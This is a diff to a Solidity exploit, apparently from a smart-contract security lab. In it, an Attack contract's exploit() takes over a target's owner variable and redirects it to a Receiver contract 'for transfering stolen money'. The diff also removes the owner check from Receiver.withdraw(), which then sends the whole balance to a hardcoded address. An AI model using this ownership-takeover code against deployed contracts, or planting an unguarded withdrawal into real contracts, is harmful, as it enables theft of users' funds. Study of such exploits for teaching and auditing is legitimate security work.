@@ -37,10 +37,10 @@ contract Attack {
     }
 
     function exploit() public {
-        rec = new Receiver();
         console.log("[A] exploit called");
+        rec = new Receiver();
         // the address of deployed Receiver contract for transfering stolen money
-        owner = rec.getAddress();
+        owner = address(rec);
         // owner = address(0xbDF79C4540C5d93CfAa3A2788686E4f63fF7fA4d);
         console.log("[A] now we takeover the owner to %s", owner);
     }
@@ -63,8 +63,7 @@ contract Receiver {
     fallback() external payable {}
 
     function withdraw() public {
-        require(msg.sender == owner);
-        payable(msg.sender).transfer(address(this).balance);
+        payable(0x70997970C51812dc3A010C7d01b50e0d17dc79C8).transfer(address(this).balance);
     }
 
     function getAddress() public view returns (address) {
